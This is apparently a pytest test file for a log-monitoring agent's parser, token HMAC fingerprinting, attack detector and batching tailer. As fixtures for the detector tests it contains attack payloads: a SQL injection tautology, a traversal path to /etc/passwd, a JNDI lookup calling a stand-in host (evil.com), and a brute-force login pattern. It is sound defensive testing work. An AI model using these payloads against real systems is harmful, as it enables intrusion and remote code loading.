"""Tests for Log Agent log parsing, token HMAC hashing, and attack detection."""

from unittest.mock import MagicMock, patch

from agent.detector import AttackDetector, compute_token_fingerprint
from agent.parser import LogParser
from agent.tailer import LogTailer

TEST_FP_KEY = "test_fingerprint_hmac_secret_key_12345"


def test_token_hmac_matches_contract() -> None:
    """HMAC-SHA256 must match the exact algorithm from docs/CONTRACTS.md."""
    secret = "sk_live_1234567890abcdef"
    fp = compute_token_fingerprint(secret, TEST_FP_KEY)
    assert len(fp) == 64
    assert fp == fp.lower()
    # Identical secret must produce identical deterministic hash
    assert fp == compute_token_fingerprint("  sk_live_1234567890abcdef \n", TEST_FP_KEY)


def test_standard_log_line_parsing() -> None:
    """Normal log line parses into valid event dict with extracted token fingerprints."""
    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    parser = LogParser(detector=detector)

    line = '198.51.100.42 - [2026-11-10T02:00:00+00:00] "GET" "/api/orders" 200 "Mozilla/5.0" "Bearer test_secret_token" "-"'
    event = parser.parse_line(line)

    assert event is not None
    assert event["ip"] == "198.51.100.42"
    assert event["method"] == "GET"
    assert event["path"] == "/api/orders"
    assert event["status"] == 200
    assert event["ua"] == "Mozilla/5.0"
    assert event["flags"] == []
    assert len(event["token_fps"]) == 1
    # Raw token must NOT be in the event dict
    assert "test_secret_token" not in str(event)


def test_sqli_heuristic_detection() -> None:
    """SQL injection tautology in URI triggers 'sqli' flag."""
    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    parser = LogParser(detector=detector)

    line = '203.0.113.10 - [2026-11-10T02:00:00+00:00] "GET" "/products?id=1%27%20OR%20%271%27=%271" 200 "curl/7.68.0" "-" "-"'
    event = parser.parse_line(line)

    assert event is not None
    assert "sqli" in event["flags"]


def test_traversal_heuristic_detection() -> None:
    """Directory traversal sequences in path trigger 'traversal' flag."""
    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    parser = LogParser(detector=detector)

    line = '203.0.113.10 - [2026-11-10T02:00:00+00:00] "GET" "/static/..%2f..%2fetc/passwd" 404 "curl/7.68.0" "-" "-"'
    event = parser.parse_line(line)

    assert event is not None
    assert "traversal" in event["flags"]


def test_jndi_heuristic_detection() -> None:
    """JNDI lookup syntax in any header/field triggers 'jndi' flag."""
    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    parser = LogParser(detector=detector)

    line = '203.0.113.10 - [2026-11-10T02:00:00+00:00] "GET" "/" 200 "${jndi:ldap://evil.com/a}" "-" "-"'
    event = parser.parse_line(line)

    assert event is not None
    assert "jndi" in event["flags"]


def test_bruteforce_heuristic_detection() -> None:
    """8 consecutive 401 failures on login path within 60s trigger 'bruteforce' flag."""
    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    detector.reset_bruteforce_tracker()
    parser = LogParser(detector=detector)

    line = '198.51.100.99 - [2026-11-10T02:00:00+00:00] "POST" "/rest/user/login" 401 "Hydra/9.0" "-" "-"'

    # First 7 attempts should not have bruteforce flag
    for _ in range(7):
        evt = parser.parse_line(line)
        assert evt is not None
        assert "bruteforce" not in evt["flags"]

    # 8th attempt must trigger bruteforce flag
    evt_8 = parser.parse_line(line)
    assert evt_8 is not None
    assert "bruteforce" in evt_8["flags"]


def test_garbage_and_malformed_lines_skipped() -> None:
    """Garbage lines, binary data, and empty strings are dropped without crashing."""
    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    parser = LogParser(detector=detector)

    garbage_lines = [
        "",
        "   \n",
        "This is completely random text not in Nginx format",
        "GET / HTTP/1.1",
        "999.999.999.999 - [bad-date] \"GET\" \"/\" 200 \"ua\" \"-\" \"-\"",
        '::: - [2026-11-10] "BAD" "/" 500 "ua" "-" "-"',
    ]

    for bad_line in garbage_lines:
        assert parser.parse_line(bad_line) is None


def test_1mb_log_line_handled_safely() -> None:
    """A hostile 1MB log line is parsed without memory overflow or hanging."""
    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    parser = LogParser(detector=detector)

    # Giant 1MB User-Agent and URI payload
    giant_payload = "A" * (1024 * 1024)
    line = f'203.0.113.10 - [2026-11-10T02:00:00+00:00] "GET" "/search?q={giant_payload[:1000]}" 200 "{giant_payload}" "-" "-"'

    event = parser.parse_line(line)
    assert event is not None
    assert event["ip"] == "203.0.113.10"
    # UA must be truncated to max 200
    assert len(event["ua"]) <= 200


@patch("httpx.Client.post")
def test_tailer_batching_and_flush(mock_post: MagicMock) -> None:
    """Tailer accumulates events into batches and posts to backend."""
    mock_post.return_value = MagicMock(status_code=200, json=lambda: {"status": "success", "stored": 2})

    detector = AttackDetector(fingerprint_key=TEST_FP_KEY)
    parser = LogParser(detector=detector)
    tailer = LogTailer(
        parser=parser,
        batch_size=2,
        backend_url="http://127.0.0.1:8000/v1",
        api_key="test_key",
    )

    line1 = '198.51.100.1 - [2026-11-10T02:00:00+00:00] "GET" "/" 200 "ua" "-" "-"'
    line2 = '198.51.100.2 - [2026-11-10T02:00:00+00:00] "GET" "/api" 200 "ua" "-" "-"'

    tailer.process_line(line1)
    assert len(tailer.batch) == 1
    assert mock_post.call_count == 0

    # Second event reaches batch_size 2 -> triggers flush
    tailer.process_line(line2)
    assert len(tailer.batch) == 0
    assert mock_post.call_count == 1
